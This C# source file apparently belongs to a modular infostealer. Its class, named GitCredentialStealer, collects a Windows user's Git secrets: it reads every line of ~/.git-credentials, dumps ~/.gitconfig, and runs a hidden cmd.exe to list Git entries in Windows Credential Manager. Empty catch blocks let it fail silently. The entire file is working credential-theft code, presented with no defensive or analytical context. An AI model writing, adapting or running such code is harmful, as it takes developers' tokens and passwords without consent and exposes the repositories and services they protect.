using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;

namespace Plugin.Apps
{
    public class GitCredentialStealer
    {
        public static Dictionary<string, string> ExtractGitCredentials()
        {
            Dictionary<string, string> credentials = new Dictionary<string, string>();
            
            try
            {
                // Check .git-credentials file
                string gitCredFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".git-credentials");
                
                if (File.Exists(gitCredFile))
                {
                    string[] lines = File.ReadAllLines(gitCredFile);
                    
                    for (int i = 0; i < lines.Length; i++)
                    {
                        if (!string.IsNullOrEmpty(lines[i]))
                        {
                            credentials[$"Git_Credential_{i}"] = lines[i];
                        }
                    }
                }
            }
            catch { }
            
            try
            {
                // Check .gitconfig
                string gitConfigFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".gitconfig");
                
                if (File.Exists(gitConfigFile))
                {
                    credentials["Git_Config"] = File.ReadAllText(gitConfigFile);
                }
            }
            catch { }
            
            try
            {
                // Check Windows Credential Manager for Git
                string output = ExecuteCommand("cmdkey /list:git:*");
                if (!string.IsNullOrEmpty(output))
                {
                    credentials["Git_CredentialManager"] = output;
                }
            }
            catch { }
            
            return credentials;
        }
        
        private static string ExecuteCommand(string command)
        {
            try
            {
                System.Diagnostics.Process process = new System.Diagnostics.Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c " + command;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.CreateNoWindow = true;
                process.Start();
                
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
                
                return output;
            }
            catch
            {
                return string.Empty;
            }
        }
    }
}
